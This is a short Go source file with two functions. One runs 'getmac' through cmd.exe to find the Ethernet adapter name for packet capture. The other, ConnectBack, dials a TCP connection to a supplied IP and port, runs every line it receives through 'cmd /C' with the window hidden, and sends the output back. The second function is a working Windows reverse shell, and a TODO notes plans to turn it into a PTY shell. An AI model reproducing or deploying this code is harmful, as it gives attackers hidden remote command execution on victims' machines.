package spec

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strings"
	"syscall"
)

func GetAdapter() string {
	var iface string
	output, err := exec.Command("cmd.exe", "/c", "getmac /fo csv /v | findstr Ethernet").Output() //getting ethernet description for pcap
	if err != nil {
		log.Panicln(err)
	}
	startIndex := strings.Index(string(output), "_{")
	finalIndex := strings.Index(string(output), "}")

	temp := string(output)[startIndex+2 : finalIndex]
	iface = "\\Device\\NPF_{" + temp + "}"

	return iface
}

func ConnectBack(ip string, connectbackPort string) {
	// TODO make this a PTY shell instead
	addr := net.JoinHostPort(ip, connectbackPort)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		// TODO: figure out error handling
		return
	}
	r := bufio.NewReader(conn)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			conn.Close()
			return
		}

		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		conn.Write(out)
	}
}
